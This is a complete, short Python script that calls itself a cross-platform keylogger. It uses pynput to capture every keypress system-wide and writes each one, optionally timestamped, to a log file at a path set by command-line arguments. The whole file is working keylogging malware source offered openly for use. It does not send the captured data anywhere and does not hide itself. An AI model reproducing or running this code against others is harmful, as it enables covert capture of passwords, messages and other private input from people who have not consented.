import logging,os,argparse,sys

from pynput.keyboard import Key, Listener

def GetSlash () :
	if (sys.platform[0] == "w") :
		return chr(92) #backslash if windows
	else :
		return chr(47) #slash if unix

def GetArgs () :
	parser = argparse.ArgumentParser(description="Cross platform keylogger powered by pynput")

	parser.add_argument("-p", "--file_path", type=str, default=os.getcwd(), help="Path for log file [default = current user]")
	parser.add_argument("-n", "--file_name", type=str, default="log", help="Name of the log file [default = log]")
	parser.add_argument("-d", "--log_date", type=int, default=1, help="Log date and time [default = 1]")

	return parser.parse_args()

def main () :
	args = GetArgs()
	sl = GetSlash()

	log_dir = args.file_path + sl + args.file_name + ".txt"

	if (args.log_date == 1) :
		log_format = "%(asctime)s: %(message)s"
	else :
		log_format = ""
	
	logging.basicConfig(filename =log_dir, level=logging.DEBUG, format=log_format)

	with Listener(on_press=on_press) as listener:
		listener.join()

def on_press(key):
	logging.info(str(key))

if __name__ == "__main__":
	main()